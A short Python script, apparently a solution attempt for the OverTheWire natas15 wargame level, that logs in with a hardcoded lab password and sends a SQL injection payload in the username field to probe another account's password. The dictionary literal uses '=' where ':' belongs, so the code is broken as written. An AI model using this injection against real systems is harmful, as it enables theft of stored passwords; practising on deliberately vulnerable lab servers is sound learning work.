import requests

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url = "http://natas15.natas.labs.overthewire.org/"

session = requests.Session()
response = session.post(url, data = {"username" = 'natas16" AND password LIKE "%"' }, auth=(username, password))

print(response.text)
